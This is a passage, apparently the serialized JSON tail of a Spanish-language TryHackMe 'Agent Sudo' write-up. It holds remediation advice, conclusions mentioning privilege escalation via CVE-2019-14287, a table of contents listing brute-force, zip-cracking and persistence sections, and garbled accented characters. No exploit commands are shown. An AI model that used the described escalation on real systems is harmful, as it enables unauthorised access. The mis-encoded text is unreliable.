ellas requieren de la posterior interacci贸n de esta cuenta (como iniciar sesi贸n) por parte de otra persona,"}]},{"type":"element","tag":"h2","props":{"id":"resumen-ejecutivo"},"children":[{"type":"text","value":"Resumen ejecutivo"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Descripci贸n"}]},{"type":"element","tag":"h2","props":{"id":"remediaci贸n"},"children":[{"type":"text","value":"Remediaci贸n"}]},{"type":"element","tag":"ol","props":{},"children":[{"type":"element","tag":"li","props":{},"children":[{"type":"text","value":"Evita el uso de contrase帽as d茅biles."}]},{"type":"element","tag":"li","props":{},"children":[{"type":"text","value":"Actualiza "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"sudo"}]},{"type":"text","value":" a la ultima versi贸n disponible haciendo uso del gestor de paquetes de tu sistema operativo."}]}]},{"type":"element","tag":"h2","props":{"id":"conclusiones"},"children":[{"type":"text","value":"Conclusiones"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Este es un desafio relativamente facil. Introduce a los principiantes a la enumeraci贸n basica de servicios de red, ataques de fuerza bruta, "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"crackeo"}]},{"type":"text","value":" de contrase帽as y metodos basicos de ingenieria inversa. La parte mas complicada es descubrir la pagina oculta haciendo uso de un metodo muy inusual, y realizar esteganograf铆a a las imagenes descargadas (y saber que esto se debe realizar en primer lugar)."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Eventualmente tenemos la oportunidad de explotar el CVE-2019-14287, que aunque pueda resultar peligroso debido a la posibilidad de escalar privilegios con un unico comando, requiere de entradas muy especificas en el archivo sudoers y de una versi贸n de sudo del 2019 (el cual se puede actualizar facilmente con el gestor de paquetes del sistema operativo). Por supuesto, el desafio fue creado poco despues de la divulgaci贸n del CVE, pero en un contexto actual esta vulnerabilidad es muy poco probable que este presente."}]},{"type":"element","tag":"style","props":{},"children":[{"type":"text","value":"html .default .shiki span {color: var(--shiki-default);background: var(--shiki-default-bg);font-style: var(--shiki-default-font-style);font-weight: var(--shiki-default-font-weight);text-decoration: var(--shiki-default-text-decoration);}html .shiki span {color: var(--shiki-default);background: var(--shiki-default-bg);font-style: var(--shiki-default-font-style);font-weight: var(--shiki-default-font-weight);text-decoration: var(--shiki-default-text-decoration);}"}]}],"toc":{"title":"","searchDepth":2,"depth":2,"links":[{"id":"escaneo","depth":2,"text":"Escaneo"},{"id":"enumeraci贸n-de-servicios","depth":2,"text":"Enumeraci贸n de servicios","children":[{"id":"tcp21","depth":3,"text":"TCP/21"},{"id":"tcp80","depth":3,"text":"TCP/80"}]},{"id":"explotaci贸n","depth":2,"text":"Explotaci贸n","children":[{"id":"ssh","depth":3,"text":"驴SSH?"},{"id":"ftp","depth":3,"text":"FTP"},{"id":"esteganograf铆a","depth":3,"text":"Esteganograf铆a"},{"id":"crackeo-de-zip","depth":3,"text":"Crackeo de zip"},{"id":"ssh-1","depth":3,"text":"SSH"}]},{"id":"escalada-de-privilegios","depth":2,"text":"Escalada de privilegios"},{"id":"persistencia","depth":2,"text":"Persistencia"},{"id":"resumen-ejecutivo","depth":2,"text":"Resumen ejecutivo"},{"id":"remediaci贸n","depth":2,"text":"Remediaci贸n"},{"id":"conclusiones","depth":2,"text":"Conclusiones"}]}},"_type":"markdown","_id":"content:writeups:tryhackme-agent-sudo.md","_source":"content","_file":"writeups/tryhackme-agent-sudo.md","_stem":"writeups/tryhackme-agent-sudo","_extension":"md"}